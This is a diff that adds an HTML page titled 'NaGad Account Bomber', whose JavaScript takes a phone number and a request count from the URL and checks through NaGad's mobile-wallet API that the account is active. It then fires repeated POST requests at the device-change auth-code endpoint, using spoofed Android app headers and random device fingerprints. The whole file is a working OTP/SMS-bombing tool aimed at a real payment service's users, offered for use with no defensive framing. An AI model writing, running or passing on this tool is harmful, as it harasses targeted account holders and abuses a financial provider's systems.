@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bomber</title>
+</head>
+<body>
+
+<h1>NaGad Account Bomber</h1>
+
+<pre id="output">Initializing...</pre>
+
+<script>
+    // Function to get URL parameters
+    function getURLParams(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    // Get the 'numb' and 'limit' parameters from the URL
+    const num = getURLParams('numb');
+    const limit = parseInt(getURLParams('limit'), 10);
+
+    const output = document.getElementById('output');
+
+    if (num && limit) {
+        output.innerText = `Checking NaGad account status for number: ${num}...`;
+
+        // Step 1: Check if the account is active
+        fetch(`https://app.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn=${num}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "ACTIVE") {
+                    output.innerText = "Account is active. Initiating bombing...";
+                    const userId = data.userId;
+
+                    // Step 2: Perform the bombing (make multiple requests)
+                    let successCount = 0;
+                    let failedCount = 0;
+
+                    for (let i = 0; i < limit; i++) {
+                        fetch(`https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'okhttp/3.14.9',
+                                'Connection': 'Keep-Alive',
+                                'Accept-Encoding': 'gzip',
+                                'X-KM-UserId': 'None',
+                                'X-KM-User-AspId': '100012345612345',
+                                'X-KM-User-Agent': 'ANDROID/1152',
+                                'X-KM-DEVICE-FGP': generateRandomHex(32),
+                                'X-KM-Accept-language': 'bn',
+                                'X-KM-AppCode': '01'
+                            },
+                            body: JSON.stringify({ userId: userId })
+                        })
+                        .then(response => response.json())
+                        .then(responseData => {
+                            if (responseData.executionStatus && responseData.executionStatus.statusType === "EXECUTED_SUCCESS") {
+                                successCount++;
+                            } else {
+                                failedCount++;
+                            }
+                            output.innerText = `Success: ${successCount}, Failed: ${failedCount}`;
+                        })
+                        .catch(error => {
+                            failedCount++;
+                            output.innerText = `Error: ${error.message}`;
+                        });
+                    }
+                } else {
+                    output.innerText = "NaGad account is not active.";
+                }
+            })
+            .catch(error => {
+                output.innerText = "Error: " + error.message;
+            });
+    } else {
+        output.innerText = "Missing 'numb' or 'limit' parameters in the URL.";
+    }
+
+    function generateRandomHex(length) {
+        const hex = '0123456789ABCDEF';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += hex[Math.floor(Math.random() * hex.length)];
+        }
+        return result;
+    }
+</script>
+
+</body>
+</html>
